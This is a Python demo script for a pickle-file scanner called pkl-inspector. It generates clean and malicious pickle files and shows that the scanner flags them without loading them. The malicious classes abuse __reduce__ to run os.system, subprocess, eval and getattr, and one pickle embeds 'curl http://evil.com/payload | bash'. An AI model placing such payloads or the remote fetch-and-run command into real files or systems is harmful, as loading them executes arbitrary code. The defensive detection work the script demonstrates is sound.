#!/usr/bin/env python3
"""
pkl-inspector demo: Creates example pickle files and shows detection.

This script:
1. Creates clean, suspicious, and malicious pickle files
2. Shows what traditional pickle.load() would execute
3. Shows what pkl-inspector detects WITHOUT executing

WARNING: This creates actual malicious pickle files for demonstration.
The files themselves are dangerous - only pkl-inspector is safe to use on them.
"""

import pickle
import os
import sys

# Add parent to path for import
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pkl_inspector import PklInspector


# ─── Malicious Payload Classes ────────────────────────────────────────────────

class CleanData:
    """A completely safe pickle payload."""
    def __init__(self):
        self.data = [1, 2, 3, 4, 5]
        self.name = "clean_example"
        self.config = {"enabled": True, "threshold": 0.5}

    def __reduce__(self):
        # Safe reduce - just reconstructs the object
        return (self.__class__, ())


class SuspiciousPayload:
    """A suspicious payload that opens a network connection."""
    def __reduce__(self):
        # This would create a socket connection on load
        import socket
        return (socket.socket, ())


class MaliciousPayload:
    """A highly malicious payload that executes system commands."""
    def __init__(self, command="echo 'pwned'"):
        self.command = command

    def __reduce__(self):
        # This executes arbitrary commands when unpickled
        return (os.system, (self.command,))


class SubprocessPayload:
    """Payload using subprocess for execution."""
    def __reduce__(self):
        import subprocess
        return (subprocess.call, (["whoami"],))


class EvalPayload:
    """Payload using eval for code execution."""
    def __reduce__(self):
        # This evaluates arbitrary Python code
        return (eval, ("__import__('os').system('id')",))


class NestedPayload:
    """Nested reduce pattern - common obfuscation."""
    def __reduce__(self):
        # Uses getattr to dynamically resolve os.system
        return (getattr, (os, 'system', 'echo nested'))


# ─── Demo Functions ───────────────────────────────────────────────────────────

def create_example_files(output_dir: str = "examples"):
    """Create example pickle files for testing."""
    os.makedirs(output_dir, exist_ok=True)

    examples = [
        ("clean.pkl", CleanData(), "Safe pickle file with simple data"),
        ("suspicious.pkl", SuspiciousPayload(), "Opens network socket on load"),
        ("malicious.pkl", MaliciousPayload("curl http://evil.com/payload | bash"),
         "Executes curl command on load"),
        ("subprocess.pkl", SubprocessPayload(), "Uses subprocess.call on load"),
        ("eval.pkl", EvalPayload(), "Uses eval() for code execution"),
        ("nested.pkl", NestedPayload(), "Uses getattr obfuscation pattern"),
    ]

    created = []
    for filename, obj, description in examples:
        filepath = os.path.join(output_dir, filename)
        with open(filepath, 'wb') as f:
            pickle.dump(obj, f)
        created.append((filepath, description))
        print(f"Created: {filepath}")
        print(f"         {description}")

    return created


def demo_comparison(filepath: str):
    """
    Show side-by-side comparison:
    - What pickle.load() WOULD do (dangerous!)
    - What pkl-inspector detects (safe!)
    """
    print("\n" + "=" * 70)
    print(f"ANALYZING: {filepath}")
    print("=" * 70)

    # Read raw bytes
    with open(filepath, 'rb') as f:
        data = f.read()

    print(f"\nFile size: {len(data)} bytes")
    print(f"First 50 bytes (hex): {data[:50].hex()}")

    # SAFE: Use pkl-inspector
    print("\n" + "-" * 40)
    print("PKL-INSPECTOR ANALYSIS (SAFE - no execution)")
    print("-" * 40)

    inspector = PklInspector()
    result = inspector.scan(filepath)

    print(f"Score: {result['score']}")
    print(f"Verdict: {result['verdict']}")
    print(f"Safe to load: {result['safe_to_load']}")

    if result['findings']:
        print("\nFindings:")
        for f in result['findings']:
            print(f"  [{f.get('severity', 'INFO')}] {f.get('description', f.get('type'))}")
            if 'callable' in f:
                print(f"           Callable: {f['callable']}")

    if result.get('globals_found'):
        print(f"\nGlobals loaded: {result['globals_found']}")

    # DANGEROUS: What pickle.load would do
    print("\n" + "-" * 40)
    print("WHAT pickle.load() WOULD DO (DANGEROUS!)")
    print("-" * 40)

    if result['verdict'] in ('DANGEROUS', 'CRITICAL'):
        print("** NOT EXECUTING - pkl-inspector flagged as malicious **")
        print("If you had run pickle.load(), it would have:")
        for f in result['findings']:
            if 'callable' in f:
                print(f"  - Called {f['callable']}()")
            if 'pattern' in f:
                print(f"  - String contains: {f['pattern']}")
    else:
        print("This file appears safe. pickle.load() would reconstruct the object.")


def run_demo():
    """Run the full demonstration."""
    print("=" * 70)
    print("PKL-INSPECTOR DEMONSTRATION")
    print("Static analysis for Python pickle files")
    print("=" * 70)
    print()
    print("This demo creates example pickle files and shows what pkl-inspector")
    print("can detect WITHOUT executing any code.")
    print()

    # Create examples
    print("STEP 1: Creating example pickle files...")
    print("-" * 40)
    examples = create_example_files()

    # Analyze each
    print("\n\nSTEP 2: Analyzing each file...")
    for filepath, description in examples:
        demo_comparison(filepath)

    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print()
    print("pkl-inspector analyzed all files WITHOUT executing any code.")
    print()
    print("Key insight: Traditional tools like antivirus scan for known signatures.")
    print("pkl-inspector analyzes the STRUCTURE of the pickle - it sees the")
    print("__reduce__ method will call os.system() before any code runs.")
    print()
    print("This is why pkl-inspector catches zero-day payloads that")
    print("signature-based scanners miss.")
    print()
    print("Learn more: https://stillrunning.io")
    print("Install: pip install pkl-inspector")
    print()


if __name__ == "__main__":
    run_demo()
